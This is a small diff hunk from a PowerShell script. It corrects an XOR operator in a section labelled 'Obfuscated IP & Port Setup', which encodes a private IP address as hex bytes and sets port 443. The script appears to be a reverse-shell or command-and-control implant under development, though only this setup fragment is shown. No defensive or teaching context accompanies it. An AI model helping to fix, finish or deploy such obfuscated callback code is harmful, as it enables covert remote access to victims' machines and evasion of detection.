@@ -7,7 +7,7 @@
 Add-Type -AssemblyName System.Security.Cryptography
 
 # --- [Obfuscated IP & Port Setup] ---
-$SSSSX = 0x55 ^ 0xAA # CORRECTED: 'OxAA' changed to '0xAA'
+$SSSSX = 0x55 -bxor 0xAA
 $IP = [System.BitConverter]::ToString([byte[]]@(10, 211, 55, 5)).Replace("-", "")
 $P = 443
 
